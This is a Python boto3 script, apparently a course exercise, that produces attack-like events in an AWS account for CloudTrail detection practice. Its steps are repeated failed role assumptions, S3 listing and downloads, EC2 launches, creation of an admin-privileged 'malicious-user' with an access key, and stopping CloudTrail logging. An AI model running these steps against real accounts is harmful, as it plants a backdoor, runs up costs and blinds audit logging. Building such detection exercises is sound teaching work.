import boto3
import time
import random
from datetime import datetime

# Configuration
region = "us-east-1"  # ou celle de votre cours
bucket_name = "votre-bucket-de-test"  # créez un bucket S3 d'abord
role_arn = "arn:aws:iam::VOTRE-COMPTE:role/FakeRole"  # inexistant

def simulate_credential_stuffing():
    """Génère des erreurs d'authentification répétées"""
    client = boto3.client('sts')
    for i in range(20):
        try:
            client.assume_role(RoleArn=role_arn, RoleSessionName='test')
        except:
            pass
        time.sleep(1)

def simulate_s3_exfiltration():
    """Liste des buckets et télécharge des objets"""
    s3 = boto3.client('s3')
    # Lister les buckets
    buckets = s3.list_buckets()['Buckets']
    for b in buckets[:2]:
        try:
            # Lister les objets
            objects = s3.list_objects_v2(Bucket=b['Name'])
            if 'Contents' in objects:
                for obj in objects['Contents'][:5]:
                    # Simuler un téléchargement
                    s3.get_object(Bucket=b['Name'], Key=obj['Key'])
                    time.sleep(2)
        except:
            pass

def simulate_crypto_mining():
    """Lance plusieurs instances EC2 (tailles modestes)"""
    ec2 = boto3.client('ec2', region_name='us-west-2')
    for i in range(5):
        try:
            ec2.run_instances(
                ImageId='ami-0c55b159cbfafe1f0',  # Amazon Linux 2
                InstanceType='t2.micro',
                MinCount=1,
                MaxCount=1
            )
        except:
            pass
        time.sleep(2)

def simulate_iam_persistence():
    """Crée un utilisateur, une clé et attache une politique"""
    iam = boto3.client('iam')
    user_name = 'malicious-user'
    try:
        iam.create_user(UserName=user_name)
        iam.create_access_key(UserName=user_name)
        iam.attach_user_policy(
            UserName=user_name,
            PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
        )
    except:
        pass

def simulate_cloudtrail_evasion():
    """Désactive un trail existant (si vous en avez un)"""
    ct = boto3.client('cloudtrail')
    trails = ct.describe_trails()['trailList']
    if trails:
        ct.stop_logging(Name=trails[0]['Name'])

if __name__ == "__main__":
    print("Génération des attaques...")
    simulate_credential_stuffing()
    simulate_s3_exfiltration()
    simulate_crypto_mining()
    simulate_iam_persistence()
    simulate_cloudtrail_evasion()
    print("Terminé. Les événements sont dans CloudTrail (visible après quelques minutes).")